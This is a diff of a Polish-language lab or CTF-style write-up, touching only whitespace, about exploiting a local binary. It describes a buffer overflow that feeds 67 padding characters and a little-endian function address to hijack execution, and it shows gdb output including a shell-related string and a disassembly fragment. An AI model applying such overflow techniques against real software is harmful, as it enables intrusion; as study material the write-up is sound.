@@ -184,14 +184,15 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
    Podawane jest 67 jedynek, a następnie adres funkcji `destroy world` (0x080485d7) zapisany bajtami zaczynając od najmniej znaczących (konwencja little-endian).
 
    **Rezultat**:
+   
    ```
    (gdb) r
-  Starting program: /workspace/55 1111111111111111111111111111111111111111111111111111111111111111111ׅ
-  warning: Error disabling address space randomization: Operation not permitted
-  To continue you must provide security access token (21 digits)
-  BAM!
-  /bin/bash
-  During startup program terminated with signal SIGSEGV, Segmentation fault.
+   Starting program: /workspace/55 1111111111111111111111111111111111111111111111111111111111111111111ׅ
+   warning: Error disabling address space randomization: Operation not permitted
+   To continue you must provide security access token (21 digits)
+   BAM!
+   /bin/bash
+   During startup program terminated with signal SIGSEGV, Segmentation fault.
    ```
 
    Osadzenie adresu spowodowało wykonanie funkcji, która wypisała na konsolę "BAM!" oraz "/bin/bash".
@@ -206,6 +207,7 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
       Debuggując program, można go znaleźć w funkcji `validate`, bo jest tam wyświetlany.
 
       Fragment funkcji `validate`:
+	  
 	  ```
       0x080485e9 <+18>:	mov    0x804a030,%eax
    	  0x080485ee <+23>:	mov    %eax,(%esp)
@@ -240,14 +242,15 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
 
 
    Program zakończył się pomyślnie:
-   ```
+   
+    ```
    (gdb) r
 	Starting program: /workspace/55 1111111111111111111111111111111111111111111111111111111111111111111�
 	warning: Error disabling address space randomization: Operation not permitted
 	To continue you must provide security access token (21 digits)
 	sh: 1: ��������������������U��]Ít: not found
 	During startup program exited normally.
-   ```
+    ```
 
 
 
